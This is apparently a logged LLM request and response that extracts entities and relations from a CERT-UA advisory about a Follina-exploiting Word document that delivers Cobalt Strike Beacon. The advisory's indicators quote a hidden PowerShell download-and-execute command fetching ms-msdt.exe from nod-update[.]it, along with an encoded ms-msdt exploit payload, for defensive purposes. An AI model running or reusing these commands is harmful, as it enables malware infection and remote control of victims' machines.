@@ -1,0 +1,158 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens, in your own words, as specific as the text allows (e.g. `distributes-via-email`, `communicates-with-c2`, `exploits-vulnerability-in`). There is no fixed list; choose the phrase that best names the relationship.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY relation type you used in this report.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA виявлено файл "зміни оплата праці з нарахуваннями.docx", що розповсюджувався серед державних організацій України засобами електронної пошти.</p><p>З'ясовано, що документ містить посилання на зовнішній об'єкт (HTML-файл, що містить JavaScript-код), виконання якого, після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190, призведе до запуску PowerShell-команди, завантаження EXE-файлу "ms-msdt.exe" та ураження комп'ютера шкідливою програмою Cobalt Strike Beacon.</p><p>CERT-UA ініційовано заходи з блокування доменного імені та відповідного серверу.</p><p>Рекомендуємо вжити заходів зі зниження вірогідності експлуатації вразливостей (hXXps://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/). Окремо звернути увагу на процес "sdiagnhost.exe" в контексті створення підозрілих файлів та процесів.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">48bc4f0c9b3fe67610c105de0b2a6bd7&nbsp; &nbsp; 7fafbd8d6b15279ca377d5d871ecb108284fc28f905b73488850999d445c2087&nbsp; &nbsp; зміни оплата праці з нарахуваннями.docx
+754c122f3e311825adc9d46ba3665bb9&nbsp; &nbsp; cf2f412ea94253358d3b2a4eebdf2067c6952b1921f0cb754ce888a01e0e0065&nbsp; &nbsp; Good thing we disabled macros.html
+34efd97c9ed25e68b52f35b2c6cab9a5&nbsp; &nbsp; 7908d7095ed1cde36b7fd8f45966fc56f0b72ca131121fdb3f8397c0710100e1&nbsp; &nbsp; ms-msdt.exe (Cobalt Strike Beacon)
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">powershell -exec bypass -noP -nonI -w hidden IEX(New-Object Net.WebClient).DownloadFile('hXXps://nod-update[.]it/ms-msdt.exe','C:\Users\Public\ms-msdt.exe'); powershell -exec bypass -noP -nonI -w hidden C:\Users\Public\ms-msdt.exe
+ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQB4AGUAYwAgAGIAeQBwAGEAcwBzACAALQBuAG8AUAAgAC0AbgBvAG4ASQAgAC0AdwAgAGgAaQBkAGQAZQBuACAASQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAcwA6AC8ALwBuAG8AZAAtAHUAcABkAGEAdABlAC4AaQB0AC8AbQBzAC0AbQBzAGQAdAAuAGUAeABlACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAbQBzAC0AbQBzAGQAdAAuAGUAeABlACcAKQA7ACAAcABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQB4AGUAYwAgAGIAeQBwAGEAcwBzACAALQBuAG8AUAAgAC0AbgBvAG4ASQAgAC0AdwAgAGgAaQBkAGQAZQBuACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABtAHMALQBtAHMAZAB0AC4AZQB4AGUA'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""
+C:\Users\Public\ms-msdt.exe
+</pre><p><em>&nbsp;&nbsp;(Процеси):</em></p><pre class="ql-syntax" spellcheck="false">&nbsp;&nbsp;1&nbsp;&nbsp;%SYSTEMROOT%\SysWOW64\sdiagnhost.exe&nbsp;&nbsp;%SYSTEMROOT%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe "%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noP -nonI -w hidden %PUBLIC%\ms-msdt.exe
+&nbsp;&nbsp;1&nbsp;&nbsp;%SYSTEMROOT%\SysWOW64\sdiagnhost.exe&nbsp;&nbsp;%SYSTEMROOT%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe "%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noP -nonI -w hidden IEX
+&nbsp;&nbsp;11&nbsp;&nbsp;-&nbsp;%SYSTEMROOT%\SysWOW64\sdiagnhost.exe&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;-&nbsp;%PUBLIC%\ms-msdt.exe&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;-&nbsp;&nbsp;-&nbsp;
+&nbsp;&nbsp;1&nbsp;&nbsp;%SYSTEMROOT%\System32\svchost.exe&nbsp;&nbsp;%SYSTEMROOT%\System32\rundll32.exe&nbsp;rundll32.exe %SYSTEMROOT%\system32\davclnt.dll,DavSetCookie nod-update[.]it@SSL hXXps://nod-update[.]it/check-updates/c/updates
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">hXXps://nod-update[.]it/check-updates/c/updates/updates.html
+hXXps://nod-update[.]it/siteindex/b/
+hXXps://nod-update[.]it/getsearchresults
+nod-update[.]it
+185[.]64.106.39
+</pre><p><br></p><p><strong>Графічні зображення:</strong></p><p></p>
+
+=== RESPONSE (5.6s, in 2713 / out 1163 tok, STOP) ===
+{
+  "entities": [
+    {
+      "name": "зміни оплата праці з нарахуваннями.docx",
+      "kind": "malicious document",
+      "gloss": "A malicious Microsoft Word document used to exploit office vulnerabilities and deliver payloads."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe whose state organizations were targeted in this incident."
+    },
+    {
+      "name": "CVE-2021-40444",
+      "kind": "vulnerability identifier",
+      "gloss": "A remote code execution vulnerability in Microsoft MSHTML."
+    },
+    {
+      "name": "CVE-2022-30190",
+      "kind": "vulnerability identifier",
+      "gloss": "A Microsoft Windows Support Diagnostic Tool remote code execution vulnerability also known as Follina."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework developed by Microsoft."
+    },
+    {
+      "name": "ms-msdt.exe",
+      "kind": "executable file",
+      "gloss": "A malicious executable file used to drop and run Cobalt Strike Beacon."
+    },
+    {
+      "name": "Cobalt Strike Beacon",
+      "kind": "malware family",
+      "gloss": "A payload and post-exploitation agent belonging to the Cobalt Strike framework."
+    },
+    {
+      "name": "sdiagnhost.exe",
+      "kind": "executable file",
+      "gloss": "A legitimate Windows system process associated with the Scripted Diagnostics Native Host."
+    },
+    {
+      "name": "Good thing we disabled macros.html",
+      "kind": "html file",
+      "gloss": "A malicious HTML file containing JavaScript code used in the exploit chain."
+    },
+    {
+      "name": "nod-update[.]it",
+      "kind": "internet domain",
+      "gloss": "A malicious domain used for hosting exploit payloads and staging malware downloads."
+    },
+    {
+      "name": "185[.]64.106.39",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the malicious domain infrastructure in this incident."
+    }
+  ],
+  "relations": [
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "targets-entities-in",
+      "tail": "Україна",
+      "evidence": "розповсюджувався серед державних організацій України засобами електронної пошти."
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2021-40444",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2022-30190",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190"
+    },
+    {
+      "head": "ms-msdt.exe",
+      "type": "delivers-payload",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "завантаження EXE-файлу \"ms-msdt.exe\" та ураження комп'ютера шкідливою програмою Cobalt Strike Beacon."
+    },
+    {
+      "head": "nod-update[.]it",
+      "type": "hosts-file",
+      "tail": "ms-msdt.exe",
+      "evidence": "DownloadFile('hXXps://nod-update[.]it/ms-msdt.exe','C:\\Users\\Public\\ms-msdt.exe')"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "targets-entities-in",
+      "definition": "The subject malware or attack campaign targets organizations or individuals located in the object country."
+    },
+    {
+      "name": "exploits-vulnerability",
+      "definition": "The subject file, script, or campaign leverages a specific security vulnerability."
+    },
+    {
+      "name": "delivers-payload",
+      "definition": "The subject file or dropper executes, drops, or installs the object malware payload."
+    },
+    {
+      "name": "hosts-file",
+      "definition": "The subject network infrastructure hosts or serves the object file for download."
+    }
+  ]
+}
